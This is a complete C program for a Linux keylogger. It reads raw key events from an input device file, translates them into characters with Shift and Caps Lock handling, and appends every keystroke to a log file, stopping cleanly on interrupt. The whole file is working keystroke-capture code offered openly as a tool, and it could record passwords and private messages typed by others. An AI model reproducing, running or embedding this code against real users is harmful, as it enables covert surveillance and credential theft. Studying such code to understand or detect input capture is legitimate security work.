#include <bits/types.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

char *keys[] = {
    "",  "<ESC>", "1", "2",  "3",  "4",    "5", "6",  "7", "8", "9", "0",
    "-", "=",     "",  "\t", "q",  "w",    "e", "r",  "t", "y", "u", "i",
    "o", "p",     "[", "]",  "\n", "<LC>", "a", "s",  "d", "f", "g", "h",
    "j", "k",     "l", ";",  "'",  "",     "",  "\\", "z", "x", "c", "v",
    "b", "n",     "m", ",",  ".",  "/",    "",  "",   "",  " ",
};

char *shift_keys[] = {
    "",  "<ESC>", "!", "@",  "#",  "$",    "%", "^", "&", "*", "(", ")",
    "_", "+",     "",  "\t", "Q",  "W",    "E", "R", "T", "Y", "U", "I",
    "O", "P",     "{", "}",  "\n", "<LC>", "A", "S", "D", "F", "G", "H",
    "J", "K",     "L", ":",  "\"", "",     "",  "|", "Z", "X", "C", "V",
    "B", "N",     "M", "<",  ">",  "?",    "",  "",  "",  " ",
};

size_t keys_length = sizeof(keys) / sizeof(keys[0]);

FILE *log_file = NULL;
int fd = -1;

struct input_event ie;

void log_time_and_signal(int sig)
{
    time_t t;
    time(&t);
    struct tm *ts = localtime(&t);

    fprintf(log_file, "\n Key Logger stopped successfully (signal: %d) - ",
            sig);
    fprintf(log_file, "%d-%d-%d %d:%d:%d\n", ts->tm_year + 1900, ++ts->tm_mon,
            ts->tm_mday, ts->tm_hour, ts->tm_min, ts->tm_sec);
}

void on_kill(int sig)
{
    if (log_file != NULL) {
        log_time_and_signal(sig);
        fflush(log_file);
        fclose(log_file);
    }
    if (fd != -1) {
        close(fd);
    }
    exit(0);
}

int main(int argc, char *argv[])
{
    if (argc != 3) {
        fprintf(stderr, "keylogger:\n\tUsage %s <event-file> <log-file>\n",
                argv[0]);
        exit(-69);
    }

    fd = open(argv[1], O_RDONLY, 0);

    if (fd == -1) {
        fprintf(
            stderr,
            "keylogger:\n\tError: couldn't open event file (you may need to "
            "open it as root)\n");
        exit(-69);
    }

    log_file = fopen(argv[2], "a+");

    if (log_file == NULL) {
        fprintf(stderr,
                "keylogger:\n\tError: couldn't open log file (you may need to "
                "open it as root)\n");
        close(fd);
        exit(-69);
    }

    signal(SIGINT, on_kill);
    signal(SIGTERM, on_kill);

    printf("keylogger:\n\tLog: Key logger is active...\n\tLog: Reading from "
           "%s...\n\n",
           argv[1]);

    int is_caps_on = 0;
    int is_shift_on = 0;

    while (1) {
        if (read(fd, &ie, sizeof(ie)) <= 0)
            continue;

        if (ie.type != EV_KEY)
            continue;

        if (ie.code == KEY_CAPSLOCK && ie.value == 1) {
            is_caps_on = !is_caps_on;
        }

        if (ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT) {
            is_shift_on = (ie.value == 1 || ie.value == 2);
        }

        if (ie.value != 1)
            continue;

        if (ie.code < keys_length) {
            char *key = keys[ie.code];

            if (key[0] != '\0') {
                int is_alpha = key[0] >= 'a' && key[0] <= 'z';
                char *out_str = key;

                if (is_alpha) {
                    int is_upper = is_caps_on ^ is_shift_on;
                    out_str = is_upper ? shift_keys[ie.code] : keys[ie.code];
                } else {
                    out_str = is_shift_on ? shift_keys[ie.code] : keys[ie.code];
                }

                printf("%s", out_str);
                fputs(out_str, log_file);

                fflush(stdout);
                fflush(log_file);
            }
        }
    }

    return 0;
}
